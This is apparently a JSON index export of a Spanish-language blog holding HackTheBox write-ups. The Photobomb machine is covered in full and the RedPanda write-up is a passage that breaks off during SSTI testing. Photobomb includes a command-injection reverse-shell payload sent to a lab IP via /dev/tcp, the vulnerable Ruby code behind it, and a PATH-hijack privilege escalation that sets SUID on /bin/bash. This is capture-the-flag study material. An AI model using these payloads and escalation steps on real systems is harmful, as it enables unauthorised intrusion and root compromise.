[ { "title": "Writeup Photobomb HTB", "url": "/posts/WriteUp-Photobomb-HTB/", "categories": "HackTheBox, Writeup, Machines, Linux", "tags": "ruby, command-injection, sinatra, BurpSuite, PATH-Hijacking", "date": "2023-02-11 00:00:00 -0500", "snippet": "La máquina photobomb cuenta con un servicio web en el cual hay un panel de autenticación básico, en él podremos registrarnos gracias a unas credenciales que están en la propia web. Después de haber ingresado, tendremos que analizar las peticiones que se envían. Encontraremos una vulnerabilidad de CI (Command Injection) porque no se está sanitizando bien las entradas; con lo cual, podremos acceder al usuario sin privilegios del sistema. En la escalada de privilegios tendremos un archivo que podemos ejecutar con permisos de superusuario, y haciendo un secuestro de un binario, nos convertiremos en el usuario root.Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Ejecutando comandos (Command Injection) Obteniendo una shell como wizard Analizando código ruby de servicio web Escalando privilegios Analizando código y secuestro del path Máquina Photobomb IP 10.10.11.182 OS Linux Dificultad Fácil Creador Nauten Herramientas y recursos empleados Herramientas nmap whatweb BurpSuite TShark EnumeraciónComenzamos realizando un escaneo con nmap a la máquina víctima:# nmap -sCV -Pn -n -oN scope.txt 10.10.11.182Nmap scan report for 10.10.11.182Host is up (0.094s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)| 256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)|_ 256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://photobomb.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Como no contamos con credenciales para conectarnos por SSH (puerto 22), vamos a enumerar el servicio que corre por el puerto 80 (HTTP). Vemos que hay un redireccionamiento al dominio photobomb así que agregamos este subdominio con la extensión (.htb) al /etc/hosts con su respectiva IP.Ahora usamos la herramienta whatweb para tener un poco más de información de la web:❯ whatweb http://photobomb.htb[200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux] nginx/1.18.0 (Ubuntu), IP[10.10.11.182], Script Title[Photobomb],UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]No hay nada relevante además de saber que el servidor es nginx ejecutándose en un sistema operativo Ubuntu. Veamos qué nos encontramos en la página:“click here!” nos lleva a un panel convencional de inicio de sesión:Antes de aplicar fuerza bruta a las rutas o subdominios, revisemos el código fuente:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Photobomb&lt;/title&gt; &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt; &lt;script src=\"photobomb.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"container\"&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt; &lt;/header&gt; &lt;article&gt; &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt; &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt; &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt; &lt;p&gt;To get started, please &lt;a href=\"/printer\" class=\"creds\"&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt; &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt; &lt;/article&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Vemos un archivo javascript llamado “photobomb.js”. Veamos qué contiene:function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer'); }}window.onload = init;Hay una función la cual “pre-propula” las credenciales para el soporte técnico en la página. La función busca una cookie llamada “isPhotoBombTechSupport” y si existe, establece un atributo “href” al elemento con clase “creds” con la URL. La función se ejecuta cuando la página haya terminado de cargar. Y bueno, tiene credenciales, así que probamos en el panel de autenticación básico y vemos lo siguiente:Si probamos las credenciales por SSH no tenemos acceso, no sería tan fácil después de todo :/Como no sabemos el tipo de tecnología que se está empleando, podemos aprovecharnos de los errores que el servidor retorne. En este caso he apuntado al archivo “index.php” (muy común en aplicativos PHP), y aparece el siguiente error:Con esto podemos deducir que se está empleando ruby para el aplicativo web.Revisando el código fuente en esta ruta de la web, vemos que se hace una petición por POST:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Photobomb&lt;/title&gt; &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"container\"&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt; &lt;/header&gt; &lt;form id=\"photo-form\" action=\"/printer\" method=\"post\"&gt; &lt;h3&gt;Select an image&lt;/h3&gt; &lt;fieldset id=\"image-wrapper\"&gt; &lt;input type=\"radio\" name=\"photo\" value=\"voicu-apostol-MWER49YaD-M-unsplash.jpg\" id=\"voicu-apostol-MWER49YaD-M-unsplash.jpg\" checked=\"checked\" /&gt;&lt;label for=\"voicu-apostol-MWER49YaD-M-unsplash.jpg\" style=\"background-image: url(ui_images/voicu-apostol-MWER49YaD-M-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"masaaki-komori-NYFaNoiPf7A-unsplash.jpg\" id=\"masaaki-komori-NYFaNoiPf7A-unsplash.jpg\"/&gt;&lt;label for=\"masaaki-komori-NYFaNoiPf7A-unsplash.jpg\" style=\"background-image: url(ui_images/masaaki-komori-NYFaNoiPf7A-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg\" id=\"andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg\"/&gt;&lt;label for=\"andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg\" style=\"background-image: url(ui_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"tabitha-turner-8hg0xRg5QIs-unsplash.jpg\" id=\"tabitha-turner-8hg0xRg5QIs-unsplash.jpg\"/&gt;&lt;label for=\"tabitha-turner-8hg0xRg5QIs-unsplash.jpg\" style=\"background-image: url(ui_images/tabitha-turner-8hg0xRg5QIs-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"nathaniel-worrell-zK_az6W3xIo-unsplash.jpg\" id=\"nathaniel-worrell-zK_az6W3xIo-unsplash.jpg\"/&gt;&lt;label for=\"nathaniel-worrell-zK_az6W3xIo-unsplash.jpg\" style=\"background-image: url(ui_images/nathaniel-worrell-zK_az6W3xIo-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"kevin-charit-XZoaTJTnB9U-unsplash.jpg\" id=\"kevin-charit-XZoaTJTnB9U-unsplash.jpg\"/&gt;&lt;label for=\"kevin-charit-XZoaTJTnB9U-unsplash.jpg\" style=\"background-image: url(ui_images/kevin-charit-XZoaTJTnB9U-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"calvin-craig-T3M72YMf2oc-unsplash.jpg\" id=\"calvin-craig-T3M72YMf2oc-unsplash.jpg\"/&gt;&lt;label for=\"calvin-craig-T3M72YMf2oc-unsplash.jpg\" style=\"background-image: url(ui_images/calvin-craig-T3M72YMf2oc-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg\" id=\"eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg\"/&gt;&lt;label for=\"eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg\" style=\"background-image: url(ui_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"finn-whelen-DTfhsDIWNSg-unsplash.jpg\" id=\"finn-whelen-DTfhsDIWNSg-unsplash.jpg\"/&gt;&lt;label for=\"finn-whelen-DTfhsDIWNSg-unsplash.jpg\" style=\"background-image: url(ui_images/finn-whelen-DTfhsDIWNSg-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"almas-salakhov-VK7TCqcZTlw-unsplash.jpg\" id=\"almas-salakhov-VK7TCqcZTlw-unsplash.jpg\"/&gt;&lt;label for=\"almas-salakhov-VK7TCqcZTlw-unsplash.jpg\" style=\"background-image: url(ui_images/almas-salakhov-VK7TCqcZTlw-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg\" id=\"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg\"/&gt;&lt;label for=\"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg\" style=\"background-image: url(ui_images/mark-mc-neill-4xWHIpY2QcY-unsplash.jpg)\"&gt;&lt;/label&gt;&lt;input type=\"radio\" name=\"photo\" value=\"wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg\" id=\"wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg\"/&gt;&lt;label for=\"wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg\" style=\"background-image: url(ui_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg)\"&gt;&lt;/label&gt; &lt;/fieldset&gt; &lt;fieldset id=\"image-settings\"&gt; &lt;label for=\"filetype\"&gt;File type&lt;/label&gt; &lt;select name=\"filetype\" title=\"JPGs work on most printers, but some people think PNGs give better quality\"&gt; &lt;option value=\"jpg\"&gt;JPG&lt;/option&gt; &lt;option value=\"png\"&gt;PNG&lt;/option&gt; &lt;/select&gt; &lt;div class=\"product-list\"&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"3000x2000\" id=\"3000x2000\" checked=\"checked\"/&gt;&lt;label for=\"3000x2000\"&gt;3000x2000 - mousemat&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"1000x1500\" id=\"1000x1500\"/&gt;&lt;label for=\"1000x1500\"&gt;1000x1500 - mug&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"600x400\" id=\"600x400\"/&gt;&lt;label for=\"600x400\"&gt;600x400 - phone cover&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"300x200\" id=\"300x200\"/&gt;&lt;label for=\"300x200\"&gt;300x200 - keyring&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"150x100\" id=\"150x100\"/&gt;&lt;label for=\"150x100\"&gt;150x100 - usb stick&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"30x20\" id=\"30x20\"/&gt;&lt;label for=\"30x20\"&gt;30x20 - micro SD card&lt;/label&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;div class=\"controls\"&gt; &lt;button type=\"submit\"&gt;download photo to print&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Ejecutando comandos (Command Injection)Cuando analizamos la petición con Burp Suite, encontramos los parámetros enviados en el formulario visto anteriormente. Hice modificaciones en el valor de filetype, comenzando con un punto y coma para revisar la reacción, lo que sucedió fue que el servidor me devolvió un error 500.Llegado a cierto punto intenté inyectar un comando de consola, pero no recibía respuesta, así que envié una traza ICMP a mi máquina y esperé a que apareciera con tshark ping+-c+1+10.10.14.73:tsharksudo tshark --color -nni any icmpCapturing on 'any' ** (tshark:10598) 00:46:00.576112 [Main MESSAGE] -- Capture started. ** (tshark:10598) 00:46:00.576211 [Main MESSAGE] -- File: \"/tmp/wireshark_anyXF07V1.pcapng\" 1 0.000000000 10.10.14.73 → 10.10.14.73 ICMP 100 Echo (ping) request id=0x000a, seq=1/256, ttl=64 2 0.000022668 10.10.14.73 → 10.10.14.73 ICMP 100 Echo (ping) reply id=0x000a, seq=1/256, ttl=64 (request in 1) 3 30.026726631 10.10.11.182 → 10.10.14.73 ICMP 100 Echo (ping) request id=0x0003, seq=1/256, ttl=63 4 30.026761095 10.10.14.73 → 10.10.11.182 ICMP 100 Echo (ping) reply id=0x0003, seq=1/256, ttl=64 (request in 3)^C4 packets capturedObtuvimos respuesta de la máquina, así que está ejecutando comandos. Procedemos a conectarnos a la máquina víctima por medio de una shell inversa, en mi caso he usado la siguiente carga útil png;bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.73/4434+0&gt;%261:Obteniendo una shell como wizardnc -nlvp 4434 Listening on 0.0.0.0 4434Connection received on 10.10.11.182 50650bash: cannot set terminal process group (732): Inappropriate ioctl for devicebash: no job control in this shellwizard@photobomb:~/photobomb$Obtenemos acceso. Realizamos el tratamiento de la tty y comenzamos a enumerar el sistema como el usuario wizard.Analizando código ruby de servicio webVamos a ver cómo se está ejecutando el aplicativo para revisar el porqué nos permite inyectar comandos, el siguiente código está en el archivo server.rb:require 'sinatra'set :public_folder, 'public'get '/' do html = &lt;&lt;~HTML&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Photobomb&lt;/title&gt; &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt; &lt;script src=\"photobomb.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"container\"&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt; &lt;/header&gt; &lt;article&gt; &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt; &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt; &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt; &lt;p&gt;To get started, please &lt;a href=\"/printer\" class=\"creds\"&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt; &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt; &lt;/article&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;HTML content_type :html return htmlendget '/printer' do images = '' checked = ' checked=\"checked\" ' Dir.glob('public/ui_images/*.jpg') do |jpg_filename| img_src = jpg_filename.sub('public/', '') img_name = jpg_filename.sub('public/ui_images/', '') images += '&lt;input type=\"radio\" name=\"photo\" value=\"' + img_name + '\" id=\"' + img_name + '\"' + checked + '/&gt;&lt;label for=\"' + img_name + '\" style=\"background-image: url(' + img_src + ')\"&gt;&lt;/label&gt;' checked = '' end html = &lt;&lt;~HTML&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Photobomb&lt;/title&gt; &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"container\"&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt; &lt;/header&gt; &lt;form id=\"photo-form\" action=\"/printer\" method=\"post\"&gt; &lt;h3&gt;Select an image&lt;/h3&gt; &lt;fieldset id=\"image-wrapper\"&gt; #{images} &lt;/fieldset&gt; &lt;fieldset id=\"image-settings\"&gt; &lt;label for=\"filetype\"&gt;File type&lt;/label&gt; &lt;select name=\"filetype\" title=\"JPGs work on most printers, but some people think PNGs give better quality\"&gt; &lt;option value=\"jpg\"&gt;JPG&lt;/option&gt; &lt;option value=\"png\"&gt;PNG&lt;/option&gt; &lt;/select&gt; &lt;div class=\"product-list\"&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"3000x2000\" id=\"3000x2000\" checked=\"checked\"/&gt;&lt;label for=\"3000x2000\"&gt;3000x2000 - mousemat&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"1000x1500\" id=\"1000x1500\"/&gt;&lt;label for=\"1000x1500\"&gt;1000x1500 - mug&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"600x400\" id=\"600x400\"/&gt;&lt;label for=\"600x400\"&gt;600x400 - phone cover&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"300x200\" id=\"300x200\"/&gt;&lt;label for=\"300x200\"&gt;300x200 - keyring&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"150x100\" id=\"150x100\"/&gt;&lt;label for=\"150x100\"&gt;150x100 - usb stick&lt;/label&gt; &lt;input type=\"radio\" name=\"dimensions\" value=\"30x20\" id=\"30x20\"/&gt;&lt;label for=\"30x20\"&gt;30x20 - micro SD card&lt;/label&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;div class=\"controls\"&gt; &lt;button type=\"submit\"&gt;download photo to print&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;HTML content_type :html return htmlendpost '/printer' do photo = params[:photo] filetype = params[:filetype] dimensions = params[:dimensions] # handle inputs if photo.match(/\\.{2}|\\//) halt 500, 'Invalid photo.' end if !FileTest.exist?( \"source_images/\" + photo ) halt 500, 'Source photo does not exist.' end if !filetype.match(/^(png|jpg)/) halt 500, 'Invalid filetype.' end if !dimensions.match(/^[0-9]+x[0-9]+$/) halt 500, 'Invalid dimensions.' end case filetype when 'png' content_type 'image/png' when 'jpg' content_type 'image/jpeg' end filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype response['Content-Disposition'] = \"attachment; filename=#{filename}\" if !File.exists?('resized_images/' + filename) command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename puts \"Executing: #{command}\" system(command) else puts \"File already exists.\" end if File.exists?('resized_images/' + filename) halt 200, {}, IO.read('resized_images/' + filename) end #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype message = 'Failed to generate a copy of ' + photo halt 500, messageendVemos que para la validación en el atributo “filetype” debe comenzar ya sea con “jpg” o “png” con una expresión regular. Lo que hay después, lo ignora o no lo valida, por ello podemos inyectar comandos. Además, hay una línea donde ejecuta directamente lo que hay en la cadena del atributo “filetype”, así que usar “;” nos permite inyectar un nuevo comando como parte de la misma línea.Escalando privilegiosPrimeramente ejecutamos el comando sudo -l para revisar los permisos a nivel de sudoers (dentro del archivo sudoers), y así ver si nos han asignado alguno:wizard@photobomb:~/photobomb$ sudo -lMatching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.shwizard@photobomb:~/photobomb$Podemos cambiar las variables de entorno y ejecutar el script cleanup.sh.Analizando código y secuestro del pathVeamos qué tiene el archivo:wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash./opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;wizard@photobomb:~/photobomb$Hay algo que llama bastante la atención, el comando find no tiene ruta absoluta, así que esto nos indica que podemos hacer un secuestro del path y ejecutar comandos arbitrarios como el usuario root (teniendo en cuenta también los permisos asignados):Nos desplazamos a la ruta tmp, creamos un nuevo archivo llamado find (como el comando), dentro de él escribimos la instrucción que queremos ejecutar una vez se procese el archivo /opt/cleanup.sh llegado al punto de ejecutar el comando find dentro de él. Le damos todos los permisos (777), actualizamos el PATH con nuestra nueva ruta donde estará nuestro archivo malicioso (/tmp) y ejecutamos el comando que nos han asignado a nivel de sudoers como sudo. Es decir /opt/cleanup.sh. Revisamos el UID del binario /bin/bash para asegurarnos que todo ha salido bien. Tiene el permiso s. El documento lo podemos ejecutar como superusuario:wizard@photobomb:~/photobomb$ cd /tmpwizard@photobomb:/tmp$ echo 'chmod u+s /bin/bash' &gt; findwizard@photobomb:/tmp$ chmod 777 findwizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.shwizard@photobomb:/tmp$ ls -l /bin/bash-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashwizard@photobomb:/tmp$Ejecutamos el binario /bin/bash con el parámetro -p, el cual nos indica que vamos a iniciar sesión interactiva con una shell Bash con permisos de superusuario:wizard@photobomb:/tmp$ /bin/bash -pbash-5.0\\# whoamirootbash-5.0\\#¡Happy Hacking!" }, { "title": "WriteUp RedPanda HTB", "url": "/posts/WriteUp-RedPanda-HTB/", "categories": "HackTheBox, Writeup, Machines, Linux", "tags": "SSTI, XXE, Path-Traversal, Spring-Boot, Code-analyse, Java", "date": "2022-11-26 00:00:00 -0500", "snippet": "Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Buscando pandas rojos Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos Obteniendo una shell como el usuario woodenk Escalando privilegios Analizando procesos con pspy Analizando código en Java y explotando un XXE Máquina RedPanda IP 10.10.11.156 OS Linux Dificultad Fácil Creador Woodenk Herramientas y recursos empleados Herramientas nmap whatweb pspy wfuzz Recursos AllTheThings SecLists EnumeraciónComenzamos realizando un escaneo con nmap a la máquina víctima:Nmap 7.92 scan initiated Sun Jul 10 15:52:39 2022 as: nmap -p- -sCV -sS --min-rate 5000 --open -Pn -vvv -n -oN scope.txt 10.10.11.170RTTVAR has grown to over 2.3 seconds, decreasing to 2.0RTTVAR has grown to over 2.3 seconds, decreasing to 2.0Nmap scan report for 10.10.11.170Host is up, received user-set (1.9s latency).Not shown: 48716 filtered tcp ports (no-response), 16817 closed tcp ports (reset)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=| 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR8080/tcp open http-proxy syn-ack ttl 63| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8| Content-Language: en-US| Date: Sun, 10 Jul 2022 15:53:48 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\" dir=\"ltr\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta author=\"wooden_k\"&gt;| &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;| &lt;link rel=\"stylesheet\" href=\"css/panda.css\" type=\"text/css\"&gt;| &lt;link rel=\"stylesheet\" href=\"css/main.css\" type=\"text/css\"&gt;| &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;div class='pande'&gt;| &lt;div class='ear left'&gt;&lt;/div&gt;| &lt;div class='ear right'&gt;&lt;/div&gt;| &lt;div class='whiskers left'&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;/div&gt;| &lt;div class='whiskers right'&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;span&gt;&lt;/span&gt;| &lt;/div&gt;| &lt;div class='face'&gt;| &lt;div class='eye| HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS| Content-Length: 0| Date: Sun, 10 Jul 2022 15:53:49 GMT| Connection: close| RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 435| Date: Sun, 10 Jul 2022 15:53:49 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 | Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 |_ Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;|_http-title: Red Panda Search | Made with Spring Boot| http-methods: |_ Supported Methods: GET HEAD OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jul 10 15:54:31 2022 -- 1 IP address (1 host up) scanned in 112.04 secondsSolamente hay dos puertos abiertos, el 22 (SSH) y el 8080 (HTTP). De momento no contamos con usuarios ni credenciales para conectarnos a través de SSH. Vamos a enumerar el puerto 8080. Iniciemos usando la herramienta whatweb y ver qué nos reporta:❯ whatweb http://10.10.11.170:8080 http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]Buscando pandas rojosNo nos dice gran cosa, además de ver que se está empleando Spring Boot un framework de Java. También podemos ver lo mismo en el reporte que nos hizo nmap. Procedamos a visualizar la web en nuestro navegador:Como vimos en el reporte que nos hizo whatweb, sabemos que es un buscador de pandas rojos. Bueno, vamos a buscar pandas rojos, obviamente:—Ese panda se ve un poco surreal—. Ahora ¿Qué tal si probamos alguna inyección tipica como SQL, XSS, LFI, etc? No sucede nada, pero sabemos que se está empleando Java, y puede darnos un indicio para intentar probar un payload para inyectar código malicioso. Veamos lo que sucede:Nos está baneando algún caracter especial ([$*{}]), así que podemos hacer un script que nos muestre qué caracteres se están bloqueando, lo podemos hacer con python o con otro lenguaje. En mi caso usaré wfuzz de la siguiente manera:❯ wfuzz -c --ss 'banned characters' -w /usr/share/SecLists/Fuzzing/special-chars.txt -d 'name=FUZZ' http://10.10.11.170:8080/search********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.170:8080/searchTotal requests: 32=====================================================================ID Response Lines Word Chars Payload =====================================================================000000001: 200 28 L 69 W 755 Ch \"~\" 000000005: 200 28 L 69 W 755 Ch \"$\" 000000013: 200 28 L 69 W 755 Ch \"_\" Total time: 2.242391Processed Requests: 32Filtered Requests: 29Requests/sec.: 14.27047Se destaca el comando --ss, el cual nos muestra solo las solicitudes en las que aparezca el parámetro dado (banned characters) en la respuesta. Vemos que hay 3 caracteres especiales que están siendo bloqueados. No podremos usarlos; sin embargo, el diccionario tiene 32 caracteres, nos quedarían 29 caracteres para probar una inyección. Llegados a este punto, he creado un diccionario quitando los 3 caracteres que nos están bloqueando:❯ grep -vE '~|\\$|_' /usr/share/SecLists/Fuzzing/special-chars.txt &gt; $(pwd)/dict.txt Ahora podemos hacer un script para verificar con qué caracteres obtendremos un resultado diferente, en mi caso hice una linea en bash:❯ for i in $(cat dict.txt); do echo -e \"Caracter: ${i}\"; curl -s -d \"name=${i}{7*7}\" http://10.10.11.170:8080/search | grep 'You searched for: 49'; doneExplotando la vulnerabilidad SSTI mientras buscamos pandas rojosEs probable que no sea tan 